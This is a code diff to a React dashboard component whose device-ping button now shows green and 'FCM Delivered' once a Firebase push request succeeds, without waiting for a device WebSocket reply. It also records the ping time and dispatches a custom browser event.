@@ -1516,8 +1516,11 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
     try {
       const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
       if (!r.ok) { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); return; }
-      // FCM delivered — NOW arm listener for device WS response
-      pingActiveRef.current = true;
+      // FCM delivered — immediately show green
+      (window._mrPingedAt = window._mrPingedAt || {})[device.deviceId] = Date.now();
+      window.dispatchEvent(new CustomEvent("mrrobot:fcm_pinged", { detail: { deviceId: device.deviceId } }));
+      setPingState("ok");
+      setTimeout(() => { setPingState("idle"); setPingCountdown(0); }, 30000);
     } catch { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
   }
 
@@ -1661,9 +1664,9 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
               // Direct-fire buttons — no dialog
               if (key === "online_check") {
                 const st = pingState;
-                const bg = st === "err" ? T.red : st === "sending" ? T.accentGlow : T.card;
-                const bc = st === "err" ? T.red : st === "sending" ? T.accent : T.borderLight;
-                const col = st === "sending" ? T.accentLight : st === "err" ? "#fff" : T.mutedLight;
+                const bg = st === "ok" ? T.green : st === "err" ? T.red : st === "sending" ? T.accentGlow : T.card;
+                const bc = st === "ok" ? T.green : st === "err" ? T.red : st === "sending" ? T.accent : T.borderLight;
+                const col = st === "ok" || st === "sending" || st === "err" ? "#fff" : T.mutedLight;
                 return (
                   <button key={key} onClick={() => void firePing()} disabled={st === "sending" || !device.hasFcm} style={{
                     background: bg, border: `1.5px solid ${bc}`, borderRadius: 9, padding: "11px 4px",
@@ -1671,7 +1674,7 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
                     fontSize: 11, fontWeight: 600, color: col, textAlign: "center", transition: "all 0.15s",
                     display: "flex", alignItems: "center", justifyContent: "center", gap: 4,
                   }}>
-                    {st === "sending" ? <><Spinner size={10} /> {pingCountdown}s…</> : st === "err" ? "✗ Error" : label}
+                    {st === "sending" ? <><Spinner size={10} /> {pingCountdown}s…</> : st === "ok" ? "FCM Delivered" : st === "err" ? "Error" : label}
                   </button>
                 );
               }
